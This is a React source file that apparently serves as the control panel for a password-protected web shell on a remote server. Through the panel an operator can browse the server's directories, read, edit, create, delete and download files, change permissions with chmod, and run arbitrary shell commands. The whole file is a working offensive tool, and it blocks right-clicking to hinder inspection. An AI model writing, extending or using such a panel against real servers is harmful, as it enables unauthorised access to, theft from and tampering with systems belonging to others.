import React, { Component } from "react";
import { Redirect } from "react-router";

// library
import axios from "axios";
import $ from "jquery";
import ReactBSAlert from "react-bootstrap-sweetalert";
import fileDownload from "js-file-download";

// style
import Loading from "../../components/Loading";

// Components
import Container from "../../components/remote_shell/Container";
import Table from "../../components/Table";
import { toast } from "react-toastify";

const editable = ["txt", "php", "html", "css", "js", "xml", "bat", "sh"];

class FileManager extends Component {
  constructor(props) {
    super(props);
    this.state = {
      // wajib
      isLoaded: false,
      error: false,
      alertModal: null,

      // gathering
      info: {},
      path: [],
      listdir: [],
      listfile: [],

      // tools
      cmd: null,
      cli_result: null,
    };
  }

  // handler
  handleInputChange = (event) => {
    const target = event.target;
    const name = target.name;
    var value = target.type === "checkbox" ? target.checked : target.value;

    if (value.length === 0) {
      value = null;
    }

    this.setState({
      [name]: value,
    });
  };

  AnimasiLoading = () => {
    this.closeModal();
    this.setState({
      alertModal: (
        <ReactBSAlert
          style={{
            display: "block",
            background: "",
            color: "white",
          }}
          //
          showConfirm={false}
          showCancel={false}
          showCloseButton={false}
          closeOnClickOutside={false}
          //
          onConfirm={() => this.closeModal()}
          onCancel={() => this.closeModal()}
        >
          <Loading
            size={100}
            message={"Loading..."}
            style={{ textAlign: "center" }}
          />
        </ReactBSAlert>
      ),
    });
  };

  sender = (perihal, url, data_object, Response, Error, Finally) => {
    const data = new FormData();
    for (let key of Object.keys(data_object)) {
      data.append(key, data_object[key]);
    }

    axios
      .post(url, data)
      .then(function (response) {
        Response(JSON.parse(response.request.responseText));
      })
      .catch(function (error) {
        Error(`Error ${perihal} : ${error.message}`, error.message);
      })
      .finally(function () {
        Finally();
      });
  };

  ShowModal = (onShow, content, width = 500, onTop = false) => {
    this.closeModal();
    this.setState({
      alertModal: (
        <ReactBSAlert
          style={{
            display: "block",
            color: "black",
            width: width,
          }}
          //
          showConfirm={false}
          showCancel={false}
          showCloseButton={true}
          closeOnClickOutside={false}
          customClass={{
            closeButton: "close-button-class",
          }}
          //
          onConfirm={() => this.closeModal(onTop)}
          onCancel={() => this.closeModal(onTop)}
          //
          afterMount={() => onShow()}
        >
          {content}
        </ReactBSAlert>
      ),
    });
  };
  closeModal = (scrollToTop = false) => {
    this.setState({ alertModal: null });
    if (scrollToTop) {
      this.scrollOnTop();
    }
  };

  ModalTanya = (pertanyaan, isConfirm) => {
    this.closeModal();
    this.setState({
      alertModal: (
        <ReactBSAlert
          style={{ display: "block" }}
          btnSize=""
          confirmBtnText={
            <button variant="contained" color="secondary">
              Ya
            </button>
          }
          onConfirm={() => isConfirm()}
          onCancel={() => this.closeModal()}
          showCancel={true}
          cancelBtnText={
            <button variant="contained" color="success">
              Batal
            </button>
          }
          reverseButtons
          showCloseButton={true}
          closeOnClickOutside={false}
        >
          {pertanyaan}
        </ReactBSAlert>
      ),
    });
  };

  scrollOnTop = () => {
    document.documentElement.scrollTop = 0;
    document.scrollingElement.scrollTop = 0;
  };

  toastSuccess = (message) => {
    toast.dark("✅ " + message, {
      position: "top-right",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
    });
  };

  toastError = (message) => {
    toast.error("⛔ " + message, {
      position: "top-right",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
    });
  };

  componentDidMount() {
    this.scrollOnTop();

    if (localStorage.getItem("session")) {
      const setState = (array) => {
        this.setState(array);
      };

      this.sender(
        "componentDidMount",
        localStorage.getItem("remote_link"),
        {
          password: localStorage.getItem("password"),
          explore: true,
        },
        function (response) {
          // console.log(response);
          if (response.success) {
            setState({
              info: response.info,
              path: response.explore.path,
              listdir: response.explore.list.dir,
              listfile: response.explore.list.file,
            });
          } else {
            setState({
              notice: response.message,
            });
          }
        },
        function (error) {
          console.log(error);
        },
        function () {
          // kosong
          setState({
            isLoaded: true,
          });
        }
      );
    } else {
      this.setState({
        isLoaded: true,
      });
    }

    const closeModal = (onTop = false) => {
      this.closeModal(onTop);
    };
    // const state = (key) => {
    //   return this.state[key];
    // };

    // Active Function
    $(document).keyup(function (e) {
      if (e.key === "Escape") {
        // escape key maps to keycode `27`
        // <DO YOUR WORK HERE>
        closeModal(true);
      }
    });
    // $(document).keydown(function (e) {
    //   if ((e.key === "s" || e.key === "S") && (e.ctrlKey || e.metaKey)) {
    //     if (state("alertModal")) {
    //       e.preventDefault();
    //       alert("Ctrl-s pressed");
    //     }
    //     return false;
    //   }
    //   return true;
    // });
  }

  change_path = (path) => {
    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path); // change path

    const setState = (array) => {
      this.setState(array);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        //
        const hasil = JSON.parse(response.request.responseText);
        setState({
          info: hasil.info,
          path: hasil.explore.path,
          listdir: hasil.explore.list.dir,
          listfile: hasil.explore.list.file,
          alertModal: null,
        });
      })
      .catch(function (error) {
        //
      });
  };
  stringPath = () => {
    return this.state.path
      .map((val) => {
        return val.name + "/";
      })
      .join("");
  };

  exe = (cmd) => {
    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("cmd", cmd);

    const setState = (array) => {
      this.setState(array);
    };
    const toastError = (message) => {
      this.toastError(message);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        //
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.cmd !== undefined && hasil.cmd) {
            setState({
              info: hasil.info,
              cli_result: hasil.result,
            });

            window.scrollTo(0, document.body.scrollHeight);
          } else {
            //
          }
        } else {
          toastError(hasil.message);
        }
      })
      .catch(function (error) {
        //
      })
      .finally(function () {
        setState({
          alertModal: null,
        });
      });
  };

  make_dir = (new_dir) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("new_dir", path + new_dir);

    const setState = (array) => {
      this.setState(array);
    };
    const toastSuccess = (message) => {
      this.toastSuccess(message);
    };
    const toastError = (message) => {
      this.toastError(message);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.result) {
          toastSuccess("Create Folder Done !!");
        } else {
          toastError("Create Folder Error !!");
        }
        setState({
          info: hasil.info,
          path: hasil.explore.path,
          listdir: hasil.explore.list.dir,
          listfile: hasil.explore.list.file,
          alertModal: null,
        });
      })
      .catch(function (error) {
        //
      });
  };

  make_file = (new_file, src) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("new_file", path + new_file);
    data.append("src", src);

    const setState = (array) => {
      this.setState(array);
    };
    const toastSuccess = (message) => {
      this.toastSuccess(message);
    };
    const toastError = (message) => {
      this.toastError(message);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.new_file) {
            // change
            toastSuccess("Create File Done !!");
          } else {
            toastError("Create File Error !!");
          }
          setState({
            info: hasil.info,
            path: hasil.explore.path,
            listdir: hasil.explore.list.dir,
            listfile: hasil.explore.list.file,
            alertModal: null,
          });
        } else {
          toastError("Create File Error !!");
        }
      })
      .catch(function (error) {
        //
      });
  };

  rename = (old_name, new_name) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("rename", path + new_name);
    data.append("oldname", path + old_name);

    const setState = (array) => {
      this.setState(array);
    };
    const toastSuccess = (message) => {
      this.toastSuccess(message);
    };
    const toastError = (message) => {
      this.toastError(message);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.rename) {
            // change
            toastSuccess("Rename Done !!");
          } else {
            toastError("Rename Error !!");
          }
          setState({
            info: hasil.info,
            path: hasil.explore.path,
            listdir: hasil.explore.list.dir,
            listfile: hasil.explore.list.file,
            alertModal: null,
          });
        } else {
          toastError("Create File Error !!");
        }
      })
      .catch(function (error) {
        //
      });
  };

  delete = (name, type) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("delete", path + name);
    data.append("type", type);

    const setState = (array) => {
      this.setState(array);
    };
    const toastSuccess = (message) => {
      this.toastSuccess(message);
    };
    const toastError = (message) => {
      this.toastError(message);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.delete) {
            // change
            toastSuccess("Delete Done !!");
          } else {
            console.log(hasil);
            toastError("Delete Error !!");
          }
          setState({
            info: hasil.info,
            path: hasil.explore.path,
            listdir: hasil.explore.list.dir,
            listfile: hasil.explore.list.file,
            alertModal: null,
          });
        } else {
          toastError("Create File Error !!");
        }
      })
      .catch(function (error) {
        //
      });
  };

  readFile = (val) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("read", path + val.name);

    const setState = (array) => {
      this.setState(array);
    };
    const toastError = (message) => {
      this.toastError(message);
    };
    const ShowModal = (onShow, content, width = 500, onTop = false) => {
      this.ShowModal(onShow, content, width, onTop);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.read) {
            // change
            ShowModal(
              function () {
                console.log(`Open: ${val.name}`);
              },
              <>
                <h5>Open: {val.name}</h5>
                <textarea cols="30" rows="10">
                  {hasil.src}
                </textarea>

                <table>
                  <tr>
                    <td style={{ textAlign: "right" }}>Created At :</td>
                    <td>{val.created}</td>
                  </tr>
                  <tr>
                    <td style={{ textAlign: "right" }}>Modified At :</td>
                    <td>{val.modified}</td>
                  </tr>
                </table>
              </>,
              "90%"
            );
          } else {
            console.log(hasil);
            toastError("Read Error !!");
          }
          setState({
            info: hasil.info,
            path: hasil.explore.path,
            listdir: hasil.explore.list.dir,
            listfile: hasil.explore.list.file,
          });
        } else {
          toastError("Create File Error !!");
        }
      })
      .catch(function (error) {
        //
      });
  };

  editFile = (name) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("read", path + name);

    const setState = (array) => {
      this.setState(array);
    };
    const toastSuccess = (message) => {
      this.toastSuccess(message);
    };
    const toastError = (message) => {
      this.toastError(message);
    };
    const ShowModal = (onShow, content, width = 500, onTop = false) => {
      this.ShowModal(onShow, content, width, onTop);
    };

    const AnimasiLoading = () => {
      this.AnimasiLoading();
    };
    AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.read) {
            // change
            ShowModal(
              function () {
                console.log(`Open: ${name}`);
              },
              <>
                <h5>Edit: {name}</h5>
                <textarea
                  id="input_src"
                  cols="30"
                  rows="10"
                  onChange={(e) => {
                    if (hasil.src !== e.target.value) {
                      document.getElementById("btn_submit").style.display = "";
                    } else {
                      document.getElementById("btn_submit").style.display =
                        "none";
                    }
                  }}
                >
                  {hasil.src}
                </textarea>

                <input
                  type="submit"
                  id="btn_submit"
                  value="Submit"
                  style={{
                    color: "black",
                    backgroundColor: "lime",
                    display: "none",
                  }}
                  onClick={(e) => {
                    e.preventDefault();
                    var src = document.getElementById("input_src").value;

                    const data = new FormData();
                    data.append("password", localStorage.getItem("password"));
                    data.append("explore", true);
                    data.append("path", path);
                    data.append("edit", path + name);
                    data.append("src", src);

                    AnimasiLoading();

                    axios
                      .post(localStorage.getItem("remote_link"), data)
                      .then(function (response) {
                        const hasil = JSON.parse(response.request.responseText);
                        if (hasil.success) {
                          if (hasil.edit) {
                            // change
                            toastSuccess("Edit Done !!");
                          } else {
                            console.log(hasil);
                            toastError("Edit Error !!");
                          }
                          setState({
                            info: hasil.info,
                            path: hasil.explore.path,
                            listdir: hasil.explore.list.dir,
                            listfile: hasil.explore.list.file,
                            alertModal: null,
                          });
                        } else {
                          console.log(hasil);
                          toastError("Edit Error !!");
                        }
                      })
                      .catch(function (error) {
                        //
                      });
                  }}
                />
              </>,
              "90%"
            );
          } else {
            console.log(hasil);
            toastError("Read Error !!");
          }
          setState({
            info: hasil.info,
            path: hasil.explore.path,
            listdir: hasil.explore.list.dir,
            listfile: hasil.explore.list.file,
          });
        } else {
          toastError("Create File Error !!");
        }
      })
      .catch(function (error) {
        //
      });
  };

  handleDownload = (url, filename) => {
    const closeModal = () => {
      this.closeModal();
    };
    axios
      .get(url, {
        responseType: "blob",
      })
      .then((res) => {
        fileDownload(res.data, filename);
        closeModal();
      });
  };

  downloadWebServerFile = (filename) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("read", path + filename);

    const setState = (array) => {
      this.setState(array);
    };
    const toastError = (message) => {
      this.toastError(message);
    };
    const closeModal = () => {
      this.closeModal();
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        if (hasil.success) {
          if (hasil.read) {
            const element = document.createElement("a");
            const file = new Blob([hasil.src], {
              type: "text/plain;charset=utf-8",
            });

            element.href = URL.createObjectURL(file);
            element.download = filename;
            document.body.appendChild(element);

            element.click();

            closeModal();
            element.remove();
          } else {
            console.log(hasil);
            toastError("Read Error !!");
          }
          setState({
            info: hasil.info,
            path: hasil.explore.path,
            listdir: hasil.explore.list.dir,
            listfile: hasil.explore.list.file,
          });
        } else {
          toastError("Create File Error !!");
        }
      })
      .catch(function (error) {
        //
      });
  };

  openMedia = (name, ext) => {
    const path = this.stringPath();

    this.AnimasiLoading();

    this.handleDownload(
      localStorage.getItem("remote_link") + "?download=" + path + name,
      name
    );
  };

  chmod = (name, perm) => {
    const path = this.stringPath();

    const data = new FormData();
    data.append("password", localStorage.getItem("password"));
    data.append("explore", true);
    data.append("path", path);
    data.append("chmod", path + name);
    data.append("perm", perm);

    const setState = (array) => {
      this.setState(array);
    };
    const toastSuccess = (message) => {
      this.toastSuccess(message);
    };
    const toastError = (message) => {
      this.toastError(message);
    };

    this.AnimasiLoading();

    axios
      .post(localStorage.getItem("remote_link"), data)
      .then(function (response) {
        const hasil = JSON.parse(response.request.responseText);
        // console.log(hasil);
        if (hasil.chmod) {
          toastSuccess("Change Permission Done !!");
        } else {
          toastError("Change Permission Error !!");
        }
        setState({
          info: hasil.info,
          path: hasil.explore.path,
          listdir: hasil.explore.list.dir,
          listfile: hasil.explore.list.file,
          alertModal: null,
        });
      })
      .catch(function (error) {
        //
      });
  };

  render() {
    const {
      // wajib
      isLoaded,
      error,
      alertModal,

      // gathering
      info,
      path,
      listdir,
      listfile,

      // tools
      cmd,
      cli_result,
    } = this.state;

    if (error) {
      return <>{error}</>;
    } else if (!isLoaded) {
      return (
        <div style={{ color: "#d1dad2" }} className="center-page">
          <Loading
            size={100}
            message={"Loading..."}
            style={{ textAlign: "center" }}
          />
        </div>
      );
    } else {
      document.title = this.props.title;

      // anti klik kanan
      document.addEventListener("contextmenu", (event) =>
        event.preventDefault()
      );

      return (
        <>
          {localStorage.getItem("session") ? ( // shell
            <Container
              {...this.props}
              path={path}
              isExplore={true}
              info={info}
              list={(v) => {
                this.setState({
                  listdir: v.list.dir,
                  listfile: v.list.file,
                });
              }}
              change_path={(v) => {
                this.change_path(v);
              }}
            >
              <Table
                {...this.props}
                column={["File", "Size", "Type", "Permission", "Action"]}
                first={
                  <>
                    <tr>
                      <td className="td_home">
                        <center>-</center>
                      </td>
                      <td className="td_home" align="center">
                        <center>-</center>
                      </td>
                      <td className="td_home" align="center">
                        <center>ACTION</center>
                      </td>
                      <td className="td_home" align="center">
                        <center>-</center>
                      </td>
                      <td className="td_home" align="center">
                        <center>
                          <a
                            href="#new_file"
                            onClick={(e) => {
                              e.preventDefault();
                              this.ShowModal(
                                function () {
                                  document
                                    .getElementById("input_name_file")
                                    .focus();
                                },
                                <>
                                  <h5>New File</h5>
                                  <input
                                    type="text"
                                    id="input_name_file"
                                    style={{
                                      color: "black",
                                      textAlign: "left",
                                      width: "100%",
                                    }}
                                    placeholder="name file"
                                    onKeyUp={(e) => {
                                      if (e.target.value.length > 0) {
                                        document.getElementById(
                                          "input_src"
                                        ).style.display = "";
                                      } else {
                                        document.getElementById(
                                          "input_src"
                                        ).style.display = "none";
                                      }
                                    }}
                                    onKeyPress={(event) => {
                                      if (event.which === 13) {
                                        // enter
                                        event.preventDefault();
                                        document
                                          .getElementById("input_src")
                                          .focus();
                                      }
                                    }}
                                  />
                                  <br />
                                  <textarea
                                    style={{
                                      marginTop: 10,
                                      display: "none",
                                      height: 500,
                                    }}
                                    id="input_src"
                                    cols="8"
                                    rows="5"
                                    onKeyUp={(e) => {
                                      if (e.target.value.length > 0) {
                                        document.getElementById(
                                          "btn_submit"
                                        ).style.display = "";
                                      } else {
                                        document.getElementById(
                                          "btn_submit"
                                        ).style.display = "none";
                                      }
                                    }}
                                    placeholder="content..."
                                  />
                                  <input
                                    type="submit"
                                    id="btn_submit"
                                    value="Submit"
                                    style={{
                                      color: "black",
                                      backgroundColor: "lime",
                                      display: "none",
                                    }}
                                    onClick={(e) => {
                                      e.preventDefault();
                                      var name_file =
                                        document.getElementById(
                                          "input_name_file"
                                        ).value;
                                      var src =
                                        document.getElementById(
                                          "input_src"
                                        ).value;

                                      this.make_file(name_file, src);
                                    }}
                                  />
                                </>,
                                "90%"
                              );
                            }}
                          >
                            <font color="lime">
                              <u>New File</u>
                            </font>
                          </a>{" "}
                          <a
                            href="#new_dir"
                            onClick={(e) => {
                              e.preventDefault();
                              this.ShowModal(
                                function () {
                                  document
                                    .getElementById("name_folder")
                                    .focus();
                                },
                                <>
                                  <h5>New Folder</h5>
                                  <input
                                    type="text"
                                    id="name_folder"
                                    style={{ color: "black" }}
                                    placeholder="new dir"
                                    onKeyPress={(event) => {
                                      if (event.which === 13) {
                                        // enter
                                        event.preventDefault();
                                        this.make_dir(event.target.value);
                                      }
                                    }}
                                  />
                                </>
                              );
                            }}
                          >
                            <font color="lime">
                              <u>New Dir</u>
                            </font>
                          </a>
                        </center>
                      </td>
                    </tr>
                  </>
                }
                row={
                  <>
                    {listdir.map((val) => {
                      return (
                        <tr>
                          <td
                            class="td_home"
                            style={{ textAlign: "left", cursor: "pointer" }}
                            onClick={(e) => {
                              e.preventDefault();
                              this.change_path(val.path);
                            }}
                          >
                            <img
                              src={
                                require("../../assets/icon/folder.png").default
                              }
                              style={{ width: 15 }}
                              alt="dir"
                              width="15px"
                              height="15px"
                            />{" "}
                            <a href={"#enter_directory->" + val.name}>
                              {val.name}
                            </a>
                          </td>
                          <td class="td_home">
                            <center>{val.size}</center>
                          </td>
                          <td class="td_home">
                            <center>DIR</center>
                          </td>
                          <td class="td_home">
                            <center>
                              {val.writable ? (
                                <font color="green">{val.perms}</font>
                              ) : (
                                <font color="red">{val.perms}</font>
                              )}
                            </center>
                          </td>
                          <td class="td_home">
                            <center>
                              <a
                                href={"#rename->" + val.name}
                                onClick={(e) => {
                                  e.preventDefault();
                                  this.ShowModal(
                                    function () {
                                      document
                                        .getElementById("name_file")
                                        .focus();
                                    },
                                    <>
                                      <h5>Rename: {val.name}</h5>
                                      <input
                                        type="text"
                                        id="name_file"
                                        defaultValue={val.name}
                                        style={{ color: "black" }}
                                        placeholder="new name"
                                        onKeyPress={(event) => {
                                          if (event.which === 13) {
                                            // enter
                                            event.preventDefault();
                                            this.rename(
                                              val.name,
                                              event.target.value
                                            );
                                          }
                                        }}
                                      />
                                    </>,
                                    "50%"
                                  );
                                }}
                              >
                                Rename
                              </a>{" "}
                              <a
                                href={"#delete->" + val.name}
                                onClick={(e) => {
                                  e.preventDefault();

                                  const deleteIt = (name, type) => {
                                    this.delete(name, type);
                                  };

                                  this.ModalTanya(
                                    <>
                                      Apakah ingin menghapus folder{" "}
                                      <b>"{val.name}"</b> ?
                                    </>,
                                    function () {
                                      deleteIt(val.name, "dir");
                                    }
                                  );
                                }}
                              >
                                Delete
                              </a>{" "}
                              <a
                                href={"#chmod->" + val.name}
                                onClick={(e) => {
                                  e.preventDefault();
                                  this.ShowModal(
                                    function () {
                                      document
                                        .getElementById("new_chmod")
                                        .focus();
                                    },
                                    <>
                                      <h5>chmod: {val.name}</h5>
                                      <input
                                        type="text"
                                        id="new_chmod"
                                        defaultValue={val.fileperms}
                                        style={{ color: "black" }}
                                        placeholder="new chmod"
                                        onKeyPress={(event) => {
                                          if (event.which === 13) {
                                            // enter
                                            event.preventDefault();
                                            this.chmod(
                                              val.name,
                                              event.target.value
                                            );
                                          }
                                        }}
                                      />
                                    </>
                                  );
                                }}
                              >
                                Chmod
                              </a>
                            </center>
                          </td>
                        </tr>
                      );
                    })}
                    {listfile.map((val) => {
                      return (
                        <tr>
                          <td
                            class="td_home"
                            style={{ textAlign: "left" }}
                            onClick={(e) => {
                              e.preventDefault();
                              if (editable.some((v) => val.ext.includes(v))) {
                                this.readFile(val);
                              } else {
                                this.ShowModal(
                                  function () {
                                    //
                                  },
                                  <>
                                    <h5>Properties</h5>
                                    <table>
                                      <tr>
                                        <td style={{ textAlign: "right" }}>
                                          Created At :
                                        </td>
                                        <td>{val.created}</td>
                                      </tr>
                                      <tr>
                                        <td style={{ textAlign: "right" }}>
                                          Modified At :
                                        </td>
                                        <td>{val.modified}</td>
                                      </tr>
                                    </table>
                                  </>
                                );
                              }
                            }}
                          >
                            <img
                              src={
                                require("../../assets/icon/file.png").default
                              }
                              style={{ width: 15 }}
                              alt="file"
                              width="15px"
                              height="15px"
                            />{" "}
                            <a
                              href={
                                editable.some((v) => val.ext.includes(v))
                                  ? "#read->" + val.name
                                  : "#open->" + val.name
                              }
                            >
                              {val.name}
                            </a>
                          </td>
                          <td class="td_home">
                            <center>{val.size}</center>
                          </td>
                          <td
                            class="td_home"
                            style={{
                              textAlign: "center",
                              alignContent: "center",
                              alignItems: "center",
                              verticalAlign: "center",
                            }}
                          >
                            <center>{val.ext.toUpperCase()}</center>
                          </td>
                          <td class="td_home">
                            <center>
                              {val.writable ? (
                                <font color="green">{val.perms}</font>
                              ) : (
                                <font color="red">{val.perms}</font>
                              )}
                            </center>
                          </td>
                          <td class="td_home">
                            <center>
                              {editable.some((v) => val.ext.includes(v)) ||
                              val.ext.length === 0 ? (
                                <a
                                  href={"#edit->" + val.name}
                                  onClick={(e) => {
                                    e.preventDefault();
                                    this.editFile(val.name);
                                  }}
                                >
                                  Edit
                                </a>
                              ) : null}{" "}
                              {editable.some((v) => val.ext.includes(v)) ? (
                                <a
                                  href={"#download->" + val.name}
                                  onClick={(e) => {
                                    e.preventDefault();
                                    this.downloadWebServerFile(val.name);
                                  }}
                                >
                                  Download
                                </a>
                              ) : (
                                <a
                                  href={"#download->" + val.name}
                                  onClick={(e) => {
                                    e.preventDefault();
                                    this.openMedia(val.name, val.ext);
                                  }}
                                >
                                  Download
                                </a>
                              )}{" "}
                              <a
                                href={"#rename->" + val.name}
                                onClick={(e) => {
                                  e.preventDefault();
                                  this.ShowModal(
                                    function () {
                                      document
                                        .getElementById("name_file")
                                        .focus();
                                    },
                                    <>
                                      <h5>Rename: {val.name}</h5>
                                      <input
                                        type="text"
                                        id="name_file"
                                        defaultValue={val.name}
                                        style={{ color: "black" }}
                                        placeholder="new name"
                                        onKeyPress={(event) => {
                                          if (event.which === 13) {
                                            // enter
                                            event.preventDefault();
                                            this.rename(
                                              val.name,
                                              event.target.value
                                            );
                                          }
                                        }}
                                      />
                                    </>,
                                    "50%"
                                  );
                                }}
                              >
                                Rename
                              </a>{" "}
                              <a
                                href={"#delete->" + val.name}
                                onClick={(e) => {
                                  e.preventDefault();

                                  const deleteIt = (name, type) => {
                                    this.delete(name, type);
                                  };

                                  this.ModalTanya(
                                    <>
                                      Apakah ingin menghapus file{" "}
                                      <b>"{val.name}"</b> ?
                                    </>,
                                    function () {
                                      deleteIt(val.name, "file");
                                    }
                                  );
                                }}
                              >
                                Delete
                              </a>{" "}
                              <a
                                href={"#chmod->" + val.name}
                                onClick={(e) => {
                                  e.preventDefault();
                                  this.ShowModal(
                                    function () {
                                      document
                                        .getElementById("new_chmod")
                                        .focus();
                                    },
                                    <>
                                      <h5>chmod: {val.name}</h5>
                                      <input
                                        type="text"
                                        id="new_chmod"
                                        defaultValue={val.fileperms}
                                        style={{ color: "black" }}
                                        placeholder="new chmod"
                                        onKeyPress={(event) => {
                                          if (event.which === 13) {
                                            // enter
                                            event.preventDefault();
                                            this.chmod(
                                              val.name,
                                              event.target.value
                                            );
                                          }
                                        }}
                                      />
                                    </>
                                  );
                                }}
                              >
                                Chmod
                              </a>
                            </center>
                          </td>
                        </tr>
                      );
                    })}
                  </>
                }
              />

              <br />
              <form
                style={{
                  width: "100%",
                  textAlign: "left",
                  fontSize: 14,
                  marginBottom: 20,
                }}
                onSubmit={(e) => {
                  e.preventDefault();
                  if (cmd) {
                    this.exe(cmd);
                  }
                }}
              >
                <font color="white" style={{ width: "100%" }}>
                  <label for="cmd" style={{ display: "" }}>
                    {info.usergroup.user.split("(")[0]}@{info.ip.server}:~${" "}
                  </label>
                  <input
                    type="text"
                    placeholder="_"
                    style={{ textAlign: "left", display: "", width: "70%" }}
                    name="cmd"
                    value={cmd}
                    onChange={(e) => this.handleInputChange(e)}
                    id="cmd"
                    onkeyup={() => {
                      var length = document.getElementById("cmd").value.length;
                      document
                        .getElementById("cmd")
                        .setAttribute("size", length);
                    }}
                  />
                </font>
              </form>
              <font color="white" size="5" style={{ textAlign: "left" }}>
                <pre>{cli_result}</pre>
              </font>
              {alertModal}
            </Container>
          ) : (
            <Redirect to={"/remote_shell/"} />
          )}
        </>
      );
    }
  }
}

export default FileManager;
